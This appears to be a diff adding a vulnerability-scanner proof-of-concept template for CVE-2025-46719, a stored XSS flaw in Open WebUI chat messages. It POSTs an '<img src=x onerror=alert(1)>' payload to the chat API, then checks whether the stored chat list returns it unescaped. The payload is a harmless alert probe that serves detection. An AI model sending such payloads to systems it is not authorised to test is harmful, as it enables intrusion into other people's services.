@@ -1,0 +1,47 @@
+[info]
+author = "ave"
+description = "Open WebUI 聊天消息中 HTML 标签过滤不完善导致的存储型 XSS 漏洞验证，通过 POST 聊天消息注入 img 标签，检测服务端是否未正确转义 HTML"
+id = "POC-AVE-2025-0006"
+name = "CVE-2025-46719 PoC"
+severity = "medium"
+tags = [
+    "cve-2025-46719",
+    "ave-2025-0006",
+]
+vuln_id = [
+    "CVE-2025-46719",
+    "AVE-2025-0006",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/chat/completions"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"model":"default","messages":[{"role":"user","content":"<img src=x onerror=alert(1)>"}]}'
+type = "json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(1)>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/chats"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(1)>"]
